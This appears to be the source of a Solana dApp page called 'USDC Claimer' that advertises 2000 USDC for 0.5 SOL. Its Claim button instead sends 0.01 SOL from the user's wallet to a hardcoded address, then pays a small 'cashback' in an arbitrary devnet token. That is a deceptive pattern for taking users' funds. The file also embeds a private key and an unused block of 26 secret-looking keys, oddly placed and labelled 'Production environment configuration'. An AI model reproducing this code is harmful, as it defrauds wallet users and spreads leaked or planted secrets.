/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4p6UMFVconqcdjYAp6co8zA6F824fnARqDi3Y96SVSbJiuNfaZ4qask56EErqRCoDdHADsuEHfUDE13oK5okgsCu"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "qR2FunkyMczteBwQm937yrjZHLGtw4q9otiRsSbcm9nhEWWVgcdcsc9CJg9YwZ4rozyMSKTrVd9ezZGYajWntm1",
  "key1": "3CTfWgQusQT1HLmuXLevy1mETfoq3sZUkdvCG4f4yDsS6PqsEUVNzkSDL7LdLgSpzHNK48WBX35QappJAD8K4GrJ",
  "key2": "33fVJhXf6q6A9oB8myxFnnhZZ5Lk8uK88MSC7sBSaxGXNPac5yLEMc2mfTamsoM7p9bnSqaGxnG8ZmnaAoNcif6n",
  "key3": "4PxF96WXe2mHhbxnfzsxMgHQHU1CZyJqysy4fqdkeHNwN3p1YUdMaMBtDBt1SkfQhR4dMFRp7WdWZNsFkzq3Kqju",
  "key4": "3mUmtq6LcLJvpe33ZHTNeoVD61fbcyKpw4aEdetCkbYVaC1Z7CWNbbVTq3M8JBxh7YWLSRnwQ3deTzGJo7hUxGRM",
  "key5": "2aBzPgvM8mjgtQyWUYt24HG23aoY3E3EN7r7hSUUwd9sgp5L68pCM1CY3hwZ1SsWhyEA63eQtqtBDrvbUVLvvT3S",
  "key6": "4uwgmGQvRUhpBf5EoVtWpLMHsp1VwaVLc1hUb3NSJdM1hNw6ErnSvCUsfTch7QfxTUGNYKTHUvr6HhS5cKogewAF",
  "key7": "5PfYJniLFjxGJ1jP8i9LVtYTqgS1PY6EXAyUtjqHA28fUtovH28F3nfczZhUpiYXCPQmFdCcu5UXLXVvuefQvxvB",
  "key8": "48nzScn1fWugohnmyfv2hoEXC9UN4RNgaVt2G2ZfZ2QQX1fjjsv9m7xK9mC3H1A9vnxhqwAFZfUfmxnCG4qS3GZ2",
  "key9": "4EBWQLfztpt71CDraRFfZswQvKhoAmVanh86bLU1Vqe3ZP9GyLGMJ7gHoC32MHimHwGpCE7kbNyVpNSynqhnxj7F",
  "key10": "3SP3edYUTVrWRLcwvsWeSh2QuxczJm4qFrVLCtroRM2VyKuqvbG1YkAFhZxBFi9rzos1yyTxGqufBtVyVNFACi4d",
  "key11": "5rCM1BEury6Nrq8xyafKXsSPiE33P8sDkZvtDn4kSCEfTLDrdZsJ5Uz37yxpjQji7xoPK8b2KqqePELXxXzLi2Rv",
  "key12": "5ER8dTahu2CD3mmK5dAxnvZ6A6DDDFneELPGNS1ddnjpJCj1rpwuvLhi3CqFS1ANakCtfQw7R2MH4cA2ockVnxDX",
  "key13": "5x8RjdaneKbqu6iEoYHaHGbDWmuWgH5A4PTC8j5pM49KaomnVTRYfkNPtyG5JJXo14f543axTHCdUumBRyJJheZA",
  "key14": "2cEAEgYYPfKCPvTwtBnM9FzEpJLDsCJgHZbjAzU326C8w72TdYLWYR9Asxy933E7R7JKG2GaFkCCuPEzYaaf3wj9",
  "key15": "2KQ4iKaPwQAf3KBo57xjsvAv7Jpaj6u4HJV7scEANrmc3V4wLgKE2qqLDUi71vTjwyJCJbbznMCvwErxj8oenUuV",
  "key16": "3KxnXYTKabLdPVrR1Xf9w7u37PohEP3oYKECkn5exMH6mXTob6wtJcqu3uKXkFNedBys7nx3eESF6GwdhYU9P2DN",
  "key17": "2sXFzwVBh3bYtp1k9Vm9rjZ2m3pzELL7X9si7hK2WjVf3LdRrpPDrtBxjPhqe3L1oi2cuVt6gnhoJ5Yi4jmDQin1",
  "key18": "4vGrZDvFmcC2p1ut4Lh79Tp3D87aJjFvpKEWvsdS8Ppcg6fhKc5ChWveiTm9eK12buqZUMoeBUxG4q5uAMPZcQzg",
  "key19": "af2PS3XCywmdpmwbXRAMdYyxNDVJD8ZMbnC6Pybjm96ovCDYmDXsbBis253i3Ma38LcWtaduWkbryQqpttpBBDj",
  "key20": "26svZtWTQAbgPKmpGEjLDdi7vPiD6HvVyZYZ1vZuwNQ8YfgsXReZf97MWy8QgidJFdpRMwe6hd1tqSQ87XyKi3i8",
  "key21": "5csECDsWrtLZzkMK35rRTkGU3myMkCNxmNwrzkTYgR6CRUJ92hjGpM82dzHiuGSfiZjWzE74nWqR5dhW8zDSArfs",
  "key22": "5DYz41FsbAjyjQvXDiDYHoyUhpSqhweDnMeroz6EntYGXNPmkRegr8bYZ2NNs4g9XS513Fpre9HqKAgjKCvjMzJ3",
  "key23": "2mnonimyxooDqKv4Q9pj7itxx7TNWcVXxo7QQd2taPnkEgAiFpvwHJczE63dved1ypvMDR5tqg1BdRoK6Y7A4dcF",
  "key24": "4mvisWPtkBCMNRgBAwrAhhi1Mg9Lc8qTgV6QMTEnRL9EwLfmARWr8CGK5zY3J8voaCxJwjuHo7wsAWjaMu5rUE5M",
  "key25": "bdh4vcFA1GAxBGT6GgiWHohFUJCKFSwtqPQzowTtczyTZRuYysFWFxzTydEoJq54esBUU1NWtkwpYUosGGPAc4R"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
